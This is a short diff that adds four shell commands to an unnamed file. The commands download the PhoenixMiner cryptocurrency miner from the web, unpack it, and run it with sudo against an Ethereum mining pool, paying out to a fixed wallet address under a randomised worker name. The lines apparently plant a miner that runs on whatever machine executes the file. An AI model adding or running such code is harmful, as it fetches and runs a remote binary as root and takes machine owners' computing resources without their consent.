@@ -1,0 +1,4 @@
+apt-get install libpci3
+wget https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz
+tar -xf PhoenixMiner_5.9d_Linux.tar.gz
+sudo ./PhoenixMiner_5.9d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0xD5FCd1FD850d85d650a9F3D4E164B323e05b8908.$(echo $(shuf -i 63456-8465465654 -n 1)-jhsgdn) -pass x
